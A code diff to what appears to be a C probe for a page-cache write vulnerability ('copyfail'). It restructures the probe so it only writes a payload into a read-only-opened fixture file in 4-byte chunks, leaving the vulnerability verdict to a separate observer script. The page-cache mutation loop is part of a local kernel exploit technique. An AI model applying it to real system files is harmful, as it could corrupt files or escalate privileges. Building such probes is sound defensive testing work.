@@ -58,17 +58,25 @@ static void init_file(const char *filename) {
 }
 
 int main(int argc, char **argv) {
-    (void)argc; (void)argv;
-    const char *target = "testfile";
+    (void)argc;
+    (void)argv;
 
-    init_file(target);
+    const char *target = "/copyfail-probe/testfile";
+
+    /*
+     * The observer stage creates this file:
+     *
+     *   /copyfail-probe/testfile
+     *
+     * The mutator only attempts the page-cache mutation. It does not decide
+     * whether the system is vulnerable; observer.sh checks the fixture state.
+     */
+
     sync();
-    check_file(target);
 
     int file_fd = open(target, O_RDONLY);
     if (file_fd < 0) {
         fprintf(stderr, "open(%s): %s\n", target, strerror(errno));
-        unlink(target);
         return 1;
     }
 
@@ -78,38 +86,28 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[+] payload:   %zu bytes (%zu iterations)\n",
             PAYLOAD_LEN, iters);
 
-    /* Walk the payload in 4-byte windows. window[] is 5 bytes so the
-     * trailing zero acts as a NUL terminator for the %s log below. */
     for (off_t off = 0; (size_t)off < PAYLOAD_LEN; off += 4) {
         unsigned char window[5] = { 0, 0, 0, 0, 0 };
         size_t take = (PAYLOAD_LEN - (size_t)off >= 4)
                       ? 4 : PAYLOAD_LEN - (size_t)off;
+
         memcpy(window, PAYLOAD + off, take);
 
         fprintf(stderr, "[+] patch fd=%d off=%lld bytes=\"%s\"\n",
                 file_fd, (long long)off, window);
+
         if (patch_chunk(file_fd, off, window) < 0) {
             fprintf(stderr, "[-] patch_chunk failed at offset %lld\n",
                     (long long)off);
             close(file_fd);
-            unlink(target);
             return 1;
         }
+
         fprintf(stderr, "[+] patch ok\n");
     }
 
     close(file_fd);
 
-    fprintf(stderr, "[+] page cache mutated\n");
-
-    int vulnerable = check_file(target);
-    unlink(target);
-
-    if (vulnerable) {
-        fprintf(stderr, "[!] VULNERABLE\n");
-        return 100;
-    }
-
-    fprintf(stderr, "[+] not vulnerable :)\n");
+    fprintf(stderr, "[+] page cache mutation attempt completed\n");
     return 0;
 }
